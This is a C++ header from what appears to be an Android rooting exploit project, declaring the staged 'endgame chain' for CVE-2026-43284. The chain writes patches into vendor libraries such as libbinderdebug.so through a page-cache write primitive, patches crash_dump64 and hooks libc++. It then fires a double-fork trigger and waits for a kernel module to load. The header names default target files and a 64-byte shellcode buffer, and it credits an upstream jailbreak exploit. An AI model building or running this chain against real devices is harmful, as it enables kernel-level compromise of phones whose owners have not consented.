#ifndef GHOSTLOCK_BACKEND_CVE_2026_43284_STEPS_CHAIN_HPP
#define GHOSTLOCK_BACKEND_CVE_2026_43284_STEPS_CHAIN_HPP

/* CVE-2026-43284 endgame chain (B5-6, host-testable part).
 *
 * Ordered orchestration of the vendor-carrier endgame:
 *
 *   resolve target -> compute patch -> write (contract::FileCacheWriteOps)
 *   -> verify each block by reading it back -> trigger -> wait for the
 *   LKM/UMH result -> cleanup.
 *
 * Independent rewrite of the upstream control flow in
 * DirtyFrag-Android-Root-Jailbreak@de2ab7b usermode/ankit/exp.c (configure_vendor_targets,
 * valid_vendor_target, patch_ko, patch_file_cbc, patch_hook, restore_hook,
 * createOrphanProcess, nativeRunAll). The upstream repository ships no
 * LICENSE, so this is an independent rewrite with attribution.
 *
 * Every device interaction is injected through ChainOps, so the module is
 * host-testable even though the real device steps belong to B5-9:
 *   - write:     pagecache::make_file_cache_write_ops() binds the B5-3 page-
 *                cache primitive; the chain never emits ESP datagrams itself.
 *   - read:      old-block journaling plus the post-write verify read.
 *   - build_plan: B5-5 ELF/hook + B5-4 .ko selection produce the block plan
 *                (host tests pass a pre-computed plan or a fake planner).
 *   - trigger:   the double-fork init sentry; never run from this module.
 *   - wait:      the LKM/UMH terminus marker.
 *   - release:   the single terminus that closes fds, releases buffers and
 *                wipes session secrets.
 * No target file is written and no process is forked by this header or its
 * implementation.
 *
 * Terminus ordering (every path, success or failure):
 *   1. write/verify stages stop;
 *   2. a best-effort rollback of already written blocks runs (newest first)
 *      when a write/read/verify failed;
 *   3. ChainOps::release runs exactly once;
 *   4. the caller-owned journal is scrubbed.
 *
 * ADR-0004 R1: this is a backend submodule header and must not include
 * pipeline/. */

#include "contract/capabilities.hpp"

#include <array>
#include <cstddef>
#include <cstdint>
#include <string_view>

namespace ghostlock::backend::cve_2026_43284::steps {

    inline constexpr std::size_t kChainBlockBytes = 16U;
    inline constexpr std::size_t kChainMaxCarriers = 8U;
    /* Bounded, heap-free best-effort rollback journal. A plan larger than this
     * is still written and verified; only the rollback of the overflowed blocks
     * is lost, and ChainWorkspace::journal_overflow reports it. Regions that
     * cannot be rolled back (for example the large .ko image) set
     * PatchRegion::rollback = false and never consume the journal. */
    inline constexpr std::size_t kChainRollbackBlocks = 128U;
    /* Upstream libcxx.S copies the vendor target path into a 64-byte buffer. */
    inline constexpr std::size_t kCarrierPathMaxBytes = 64U;

    /* One vendor_file carrier candidate. size == 0 means "unknown"; a non-zero
     * size bounds the patch extent. */
    struct CarrierTarget final {
        std::string_view path;
        std::uint64_t size = 0U;
    };

    /* Upstream DEFAULT_VENDOR_TARGETS order (exp.c/ExploitRunner.java). */
    inline constexpr std::array<CarrierTarget, 4U> kDefaultCarriers = {{
        {"/vendor/lib64/libbinderdebug.so", 0U},
        {"/vendor/lib64/libstagefrighthw.so", 0U},
        {"/vendor/lib64/libstagefright_aidl_bufferpool2.so", 0U},
        {"/vendor/lib64/libbsp_module.so", 0U},
    }};

    /* Mirrors upstream valid_vendor_target: absolute, under /vendor/ or
     * /system/vendor/, shorter than the 64-byte shellcode buffer and free of
     * whitespace/control separators. */
    [[nodiscard]] bool valid_carrier_path(std::string_view path) noexcept;

    /* Dev-only staged-run relaxation: the same structural constraints as
     * valid_carrier_path (absolute, shorter than the 64-byte shellcode buffer,
     * free of whitespace/control separators) but WITHOUT the /vendor or
     * /system/vendor prefix requirement. It exists solely for the explicit
     * --run-cve-2026-43284 --allow-dev-target staged entry to exercise the
     * primitive on a one-shot file (for example under /data/local/tmp). It is
     * never reachable from a profile, from build_carrier_list() or from the
     * default pipeline, so the production carrier constraint stays intact. */
    [[nodiscard]] bool valid_dev_carrier_path(std::string_view path) noexcept;

    /* Caller-owned carrier candidate buffer. add() rejects invalid paths and
     * keeps the first occurrence of a duplicate. */
    struct CarrierList final {
        std::array<CarrierTarget, kChainMaxCarriers> items{};
        std::size_t count = 0U;

        [[nodiscard]] bool add(const CarrierTarget &target) noexcept;
    };

    /* Profile-selected carriers first (in order), then kDefaultCarriers,
     * de-duplicated and validated. Returns false when the result is empty. */
    [[nodiscard]] bool build_carrier_list(const CarrierTarget *primary,
                                          std::size_t primary_count,
                                          CarrierList &out) noexcept;

    enum class ChainStage : std::uint8_t {
        Idle = 0U,
        ResolveTarget,
        ComputePlan,
        /* patch #1: splicehelper -> crash_dump64@0 (before the carrier write,
         * because the crash_dump read bridge depends on it). */
        PatchCrashDump,
        Write,
        Verify,
        /* libc++ sentry hook apply (after the carrier verify, before trigger). */
        Hook,
        Trigger,
        WaitResult,
        Cleanup,
    };

    enum class ChainError : std::uint8_t {
        None = 0U,
        NotAvailable,
        NoCarrier,
        CarrierUnusable,
        InvalidPlan,
        /* A planned region extends past the known target-file size: nothing
         * of that region may be written. */
        TargetOutOfBounds,
        /* A caller-declared pre-image did not match the target's current
         * content: the wrong or changed file, so nothing is written. */
        PreImageMismatch,
        WriteFailed,
        ReadFailed,
        VerifyMismatch,
        RollbackFailed,
        CrashDumpFailed,
        HookFailed,
        TriggerFailed,
        LkmFailed,
        WaitTimeout,
        CleanupFailed,
    };

    enum class ChainWaitOutcome : std::uint8_t {
        Pending = 0U,
        LkmLoaded,
        Failed,
        Timeout,
    };

    /* One contiguous, 16-byte-aligned region of the patch plan. bytes points at
     * caller-owned storage that must outlive run_chain(). rollback journals the
     * old block before each write; verify reads every written block back and
     * compares it byte for byte. */
    struct PatchRegion final {
        std::uint64_t offset = 0U;
        const std::uint8_t *bytes = nullptr;
        std::size_t len = 0U;
        bool verify = true;
        bool rollback = true;
        std::string_view label{};
        /* Optional pre-image assert (default off). When non-null it points at
         * len bytes that must equal the target's current content over the whole
         * region before its first byte is written. A mismatch fails the run
         * with ChainError::PreImageMismatch. A null pointer keeps the legacy
         * behaviour (no pre-image read). */
        const std::uint8_t *preimage = nullptr;
    };

    /* A patch plan must be internally closed: every region has to lie inside
     * the plan's declared extent (when non-zero), the carrier's declared size
     * (when non-zero) and the target file size (when known), and no two
     * regions may overlap. extent == 0 leaves the total extent unspecified. */
    struct PatchPlan final {
        const PatchRegion *regions = nullptr;
        std::size_t region_count = 0U;
        std::uint64_t extent = 0U;
    };

    /* How far run_chain() may advance. The device staged runner uses Write to
     * validate the page-cache write + verify before any trigger fires; the
     * default Full preserves the complete endgame. */
    enum class ChainStopAfter : std::uint8_t {
        Full = 0U,
        Write,
    };

    struct ChainRequest final {
        const CarrierTarget *carriers = nullptr;
        std::size_t carrier_count = 0U;
        /* Used when ChainOps::build_plan is null. */
        PatchPlan plan{};
        std::uint32_t wait_timeout_ms = 5000U;
        ChainStopAfter stop_after = ChainStopAfter::Full;
        /* Optional target-file size in bytes, normally from fstat(2) on the
         * opened target (0 == unknown). When non-zero every planned region must
         * satisfy offset + len <= target_size before any byte is written; a
         * violation fails closed with ChainError::TargetOutOfBounds. */
        std::uint64_t target_size = 0U;
        /* Dev-only staged-run escape hatch, default false. When true run_chain
         * validates carriers with valid_dev_carrier_path() instead of
         * valid_carrier_path(), so a non-vendor one-shot target is accepted.
         * Only the explicit --run-cve-2026-43284 --allow-dev-target entry sets
         * it; build_carrier_list() and the default pipeline never do, so the
         * default carrier constraint is unchanged. */
        bool allow_dev_carrier_path = false;
    };

    /* Injected dependencies. Every function receives write.ctx as its ctx. The
     * mandatory surface (write, read, trigger, wait, release) is bound by the
     * device backend in B5-9; host tests bind fakes. A missing binding fails
     * the matching stage instead of being skipped; build_plan is optional. */
    struct ChainOps final {
        contract::FileCacheWriteOps write{};

        /* Computes the patch plan once the target is resolved. When null the
         * request's pre-computed plan is used. */
        bool (*build_plan)(void *ctx, PatchPlan &out, ChainError &error) noexcept = nullptr;

        /* patch #1 (crash_dump64 <- splicehelper), before the carrier write.
         * Optional: when null the stage is skipped. Return None on success. */
        ChainError (*patch_crash_dump)(void *ctx) noexcept = nullptr;

        /* Reads one 16-byte block: 16 on success, or -errno. Required whenever
         * a region verifies or journals. */
        long (*read_block)(void *ctx, std::uint64_t offset,
                           std::uint8_t out[16]) noexcept = nullptr;

        /* libc++ sentry hook apply, after the carrier verify. Optional; when
         * null the stage is skipped. Return None on success. */
        ChainError (*apply_hook)(void *ctx) noexcept = nullptr;

        /* Unconditional hook restore, called in the terminus before release on
         * every path. Optional. Returns true only when a restore was actually
         * owed and attempted; a no-op returns false so hook_restored is a
         * decidable field rather than "a callback was bound". */
        bool (*restore_hook)(void *ctx) noexcept = nullptr;

        /* Launches the double-fork sentry trigger (B5-9). 0 == launched. */
        int (*trigger)(void *ctx) noexcept = nullptr;

        /* Polls the LKM/UMH terminus (B5-9). */
        ChainWaitOutcome (*wait_result)(void *ctx, std::uint32_t timeout_ms) noexcept = nullptr;

        /* Terminus: closes fds, releases buffers and wipes session secrets.
         * Runs exactly once, after every other stage, on every path. */
        void (*release)(void *ctx) noexcept = nullptr;

        [[nodiscard]] bool write_ready() const noexcept { return write.write16 != nullptr; }
        [[nodiscard]] bool read_ready() const noexcept { return read_block != nullptr; }
        [[nodiscard]] bool run_ready() const noexcept {
            return write_ready() && read_ready() && trigger != nullptr &&
                   wait_result != nullptr && release != nullptr;
        }
    };

    /* Per-run scratch. Caller-owned so the chain never allocates and never
     * touches a mutable global; reset at the start of run_chain(). */
    struct ChainWorkspace final {
        struct JournalEntry final {
            std::uint64_t offset = 0U;
            std::array<std::uint8_t, kChainBlockBytes> bytes{};
        };

        std::array<JournalEntry, kChainRollbackBlocks> journal{};
        std::size_t journal_count = 0U;
        bool journal_overflow = false;
        bool rollback_incomplete = false;

        struct CarrierAttempt final {
            std::string_view path{};
            ChainError error = ChainError::None;
            std::uint32_t blocks_written = 0U;
        };

        std::array<CarrierAttempt, kChainMaxCarriers> carrier_attempts{};
        std::size_t carrier_attempt_count = 0U;
    };

    struct ChainResult final {
        ChainStage last_stage = ChainStage::Idle;
        ChainError error = ChainError::None;
        const CarrierTarget *carrier = nullptr;
        ChainWaitOutcome wait = ChainWaitOutcome::Pending;
        std::uint32_t blocks_written = 0U;
        std::uint32_t blocks_verified = 0U;
        std::uint32_t blocks_rolled_back = 0U;
        bool lkm_loaded = false;
        bool cleanup_ran = false;
        bool crash_dump_patched = false;
        bool hook_applied = false;
        bool hook_restored = false;
        bool journal_overflow = false;
        bool rollback_incomplete = false;
        /* True once every region that declared a pre-image was read back and
         * matched before its write. Always false when no pre-image was asked
         * for, so diagnostics report preimage=absent in the default path. */
        bool preimage_checked = false;
    };

    /* Runs the endgame chain. On success (error == None, lkm_loaded) every
     * region was written and verified, the trigger fired, the LKM/UMH result
     * was observed and release ran exactly once. On failure the first failing
     * stage/error is reported, a best-effort rollback of the already written
     * blocks is attempted when a write/read/verify failed, release still runs,
     * and the journal is scrubbed. Carrier candidates are tried in order and
     * fallback happens only when a candidate is unusable before any byte was
     * written (an old-block read failed); otherwise the failure is final. */
    [[nodiscard]] ChainResult run_chain(const ChainRequest &request, const ChainOps &ops,
                                        ChainWorkspace &workspace) noexcept;

    /* Static closure check shared by run_chain(), apply_plan() and the staged
     * runner. Validates block alignment, offset overflow, the plan's declared
     * extent, the carrier's declared size and the target size, plus mutual
     * region overlap. declared_extent and target_size are 0 when unknown.
     * Returns ChainError::None when the plan is closed, TargetOutOfBounds for a
     * region past target_size, and InvalidPlan for every other violation. */
    [[nodiscard]] ChainError validate_plan_closure(const PatchPlan &plan,
                                                   std::uint64_t declared_extent,
                                                   std::uint64_t target_size) noexcept;

} // namespace ghostlock::backend::cve_2026_43284::steps

#endif
